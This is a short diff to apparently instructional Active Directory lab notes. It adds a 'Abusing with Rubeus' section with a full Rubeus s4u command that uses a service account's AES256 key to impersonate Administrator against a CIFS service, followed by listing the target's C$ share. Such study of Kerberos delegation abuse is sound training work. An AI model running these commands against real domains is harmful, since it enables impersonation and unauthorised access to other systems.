@@ -372,7 +372,7 @@ CAL.kirbi"'
 ```
 
 
-- you can now run command on remote system 
+- you can now run command on remote system ( **msDS-AllowedToDelegateTo**)
 
 
 ```
@@ -382,7 +382,19 @@ ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 
 
 
+## **Abusing with Rubeus**
 
+
+- We can use the following command (We are requesting a TGT and TGS in a single command):
+
+
+```powershell
+Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
+```
+
+
+
+ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 
 
 
